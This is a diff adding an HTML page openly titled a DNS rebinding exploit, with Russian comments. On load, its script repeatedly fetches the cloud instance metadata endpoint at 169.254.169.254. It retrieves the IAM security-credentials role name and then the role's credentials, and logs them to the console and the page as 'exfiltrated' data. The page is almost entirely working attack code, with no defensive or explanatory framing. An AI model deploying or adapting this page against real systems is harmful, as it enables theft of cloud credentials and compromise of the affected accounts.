@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DNS Rebinding Exploit</title>
+    <script>
+        let attempt = 0;
+        
+        function exfiltrateData(data) {
+            // Выводим данные в консоль (можно увидеть через View Source)
+            console.log("Exfiltrated data:", data);
+            
+            // Альтернативно: отправляем данные через URL параметры
+            const encoded = btoa(data);
+            document.getElementById('output').innerHTML = 
+                `Данные получены! Проверьте консоль или URL: #${encoded.substring(0, 100)}...`;
+        }
+
+        function fetchMetadata() {
+            attempt++;
+            console.log(`Попытка ${attempt}: доступ к метаданным...`);
+            
+            fetch('http://169.254.169.254/latest/meta-data/')
+                .then(response => {
+                    if (response.ok) return response.text();
+                    throw new Error('HTTP error');
+                })
+                .then(data => {
+                    exfiltrateData(data);
+                    
+                    // Получаем IAM credentials если доступно
+                    return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+                })
+                .then(response => response.ok ? response.text() : '')
+                .then(role => {
+                    if (role) {
+                        return fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`);
+                    }
+                    return Promise.resolve(null);
+                })
+                .then(response => response ? response.json() : null)
+                .then(credentials => {
+                    if (credentials) {
+                        console.log("IAM Credentials:", credentials);
+                    }
+                })
+                .catch(error => {
+                    console.log(`Попытка ${attempt} failed:`, error.message);
+                    
+                    // Пробуем снова через 2 секунды (ждем DNS cache expiration)
+                    if (attempt < 10) {
+                        setTimeout(fetchMetadata, 2000);
+                    }
+                });
+        }
+
+        // Запускаем атаку после загрузки страницы
+        window.onload = function() {
+            console.log("Starting DNS Rebinding attack...");
+            setTimeout(fetchMetadata, 1000);
+        };
+    </script>
+</head>
+<body>
+    <h1>DNS Rebinding Exploit</h1>
+    <div id="output">Выполняется атака... проверяйте консоль браузера (F12)</div>
+</body>
+</html>
